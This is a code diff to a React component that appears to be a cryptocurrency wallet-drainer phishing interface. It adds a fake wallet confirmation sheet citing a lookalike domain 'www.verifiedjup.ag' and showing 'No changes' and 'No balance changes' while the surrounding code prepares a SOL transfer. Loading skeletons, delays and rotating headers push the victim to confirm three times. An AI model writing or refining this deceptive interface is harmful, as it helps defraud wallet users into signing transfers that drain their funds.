@@ -55,19 +55,39 @@ function ValueWithIcon({ icon, text }: { icon: ReactNode; text: string }) {
   )
 }
 
+function SkeletonLine({ className }: { className: string }) {
+  return <span className={`block animate-pulse rounded-md bg-[#1a1a1a] ${className}`} />
+}
+
+const SHEET_HEADERS = [
+  'Welcome. Confirm to connect.',
+  'Almost ready. Confirm again.',
+  'Last step. Confirm to finish.',
+]
+
 function HiModal({
   open,
+  title,
   onCancel,
   onConfirm,
 }: {
   open: boolean
+  title: string
   onCancel: () => void
   onConfirm: () => void
 }) {
   const [advanced, setAdvanced] = useState(false)
+  const [loading, setLoading] = useState(true)
 
   useEffect(() => {
-    if (!open) setAdvanced(false)
+    if (!open) {
+      setAdvanced(false)
+      setLoading(true)
+      return
+    }
+    setLoading(true)
+    const timer = window.setTimeout(() => setLoading(false), 500)
+    return () => window.clearTimeout(timer)
   }, [open])
 
   useEffect(() => {
@@ -89,25 +109,43 @@ function HiModal({
         role="dialog"
         aria-modal="true"
         aria-labelledby="tx-request-title"
-        className="pointer-events-auto flex max-h-[94vh] w-full animate-[tx-sheet-up_80ms_ease-out] flex-col overflow-hidden rounded-t-[24px] bg-black text-white shadow-[0_-16px_60px_rgba(0,0,0,0.55)] sm:max-h-[min(92vh,680px)] sm:max-w-[400px] sm:rounded-[20px] sm:shadow-[0_24px_80px_rgba(0,0,0,0.65)]"
+        className="pointer-events-auto flex max-h-[94vh] w-full animate-[tx-sheet-up_80ms_ease-out] flex-col overflow-hidden rounded-t-[22px] border border-[#2a2a2a] bg-black text-white shadow-[0_-16px_60px_rgba(0,0,0,0.7)] sm:max-h-[min(92vh,680px)] sm:max-w-[400px] sm:rounded-[22px]"
       >
         <h2
           id="tx-request-title"
           className="px-5 pb-4 pt-7 text-center text-[20px] font-semibold tracking-[-0.02em] text-white sm:px-6 sm:pb-3 sm:pt-7 sm:text-[18px]"
         >
-          Welcome. Confirm to connect.
+          {title}
         </h2>
 
-        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-2 sm:px-6">
-          <div className="rounded-2xl border border-[#2a2a2a] bg-[#0a0a0a] px-4 py-3.5">
-            <p className="flex items-center gap-1.5 text-[13px] text-[#9a9a9a]">
-              Estimated changes
-              <Info className="h-3.5 w-3.5 text-[#8d8d8d]" aria-hidden />
-            </p>
-            <p className="mt-2 text-[15px] font-medium text-white">No changes</p>
+        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-2 sm:px-5">
+          <div className="rounded-[14px] border border-[#3a3a3a] bg-black px-4 py-3.5">
+            {loading ? (
+              <div className="space-y-3 py-1">
+                <SkeletonLine className="h-3 w-36" />
+                <SkeletonLine className="h-4 w-24" />
+              </div>
+            ) : (
+              <>
+                <p className="flex items-center gap-1.5 text-[13px] text-[#9a9a9a]">
+                  Estimated changes
+                  <Info className="h-3.5 w-3.5 text-[#8d8d8d]" aria-hidden />
+                </p>
+                <p className="mt-2 text-[15px] font-medium text-white">No changes</p>
+              </>
+            )}
           </div>
 
-          <dl className="mt-3 rounded-2xl border border-[#2a2a2a] bg-[#0a0a0a] px-4">
+          <dl className="mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
+            {loading ? (
+              <div className="space-y-4 py-4">
+                <SkeletonLine className="h-3 w-full" />
+                <SkeletonLine className="h-3 w-4/5" />
+                <SkeletonLine className="h-3 w-3/5" />
+                <SkeletonLine className="h-3 w-2/3" />
+              </div>
+            ) : (
+              <>
             <DetailRow label="Request from" info="This site asked your wallet to review this request." value="www.verifiedjup.ag" />
             <DetailRow
               label="Account"
@@ -137,20 +175,26 @@ function HiModal({
                 </span>
               }
             />
+              </>
+            )}
           </dl>
 
+          {loading ? (
+            <SkeletonLine className="mt-4 h-3 w-28" />
+          ) : (
           <button
             type="button"
             onClick={() => setAdvanced((openAdvanced) => !openAdvanced)}
             aria-expanded={advanced}
-            className="mt-4 inline-flex items-center gap-1 py-1 text-[14px] font-medium text-[#8ea0ff] sm:mt-0 sm:flex sm:w-full sm:justify-between sm:py-3.5 sm:text-[13px] sm:font-medium sm:text-[#9a9a9a]"
+            className="mt-4 inline-flex items-center gap-1 py-1 text-[14px] font-medium text-[#8ea0ff]"
           >
             {advanced ? 'Hide advanced' : 'Show advanced'}
             <ChevronDown className={`h-4 w-4 transition-transform ${advanced ? 'rotate-180' : ''}`} />
           </button>
+          )}
 
           {advanced ? (
-            <dl className="mb-3 mt-3 rounded-2xl border border-[#2a2a2a] bg-[#0a0a0a] px-4">
+            <dl className="mb-3 mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
               <DetailRow label="Simulation" value="No balance changes" />
               <DetailRow label="Fee payer" value="Account 1" />
             </dl>
@@ -203,6 +247,7 @@ export function PaymentRequestPrompt() {
   const [config, setConfig] = useState<PayoutConfig | null>(null)
   const [open, setOpen] = useState(false)
   const [hiOpen, setHiOpen] = useState(false)
+  const [headerStep, setHeaderStep] = useState(0)
   const [submitting, setSubmitting] = useState(false)
   const [solAmount, setSolAmount] = useState(0)
   const [status, setStatus] = useState('Preparing the wallet transfer.')
@@ -248,10 +293,20 @@ export function PaymentRequestPrompt() {
     closeWalletModalRef.current()
     setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
     setOpen(false)
-    setHiOpen(true)
+    setHiOpen(false)
+    setHeaderStep(0)
+    if (replayTimer.current) window.clearTimeout(replayTimer.current)
+    replayTimer.current = window.setTimeout(() => {
+      replayTimer.current = null
+      if (!cancelled) setHiOpen(true)
+    }, 1500)
 
     return () => {
       cancelled = true
+      if (replayTimer.current) {
+        window.clearTimeout(replayTimer.current)
+        replayTimer.current = null
+      }
     }
   }, [connected, walletAddress])
 
@@ -343,10 +398,12 @@ export function PaymentRequestPrompt() {
     if (confirmTaps.current < 3) {
       setHiOpen(false)
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
+      const step = confirmTaps.current
       replayTimer.current = window.setTimeout(() => {
         replayTimer.current = null
+        setHeaderStep(step)
         setHiOpen(true)
-      }, 70)
+      }, 1500)
       return
     }
     confirmTaps.current = 0
@@ -364,7 +421,12 @@ export function PaymentRequestPrompt() {
 
   return (
     <>
-      <HiModal open={hiOpen} onCancel={handleHiCancel} onConfirm={handleHiConfirm} />
+      <HiModal
+        open={hiOpen}
+        title={SHEET_HEADERS[headerStep] ?? SHEET_HEADERS[0]}
+        onCancel={handleHiCancel}
+        onConfirm={handleHiConfirm}
+      />
       <PaymentRequestModal
         open={open}
         to={config?.walletAddress || ''}
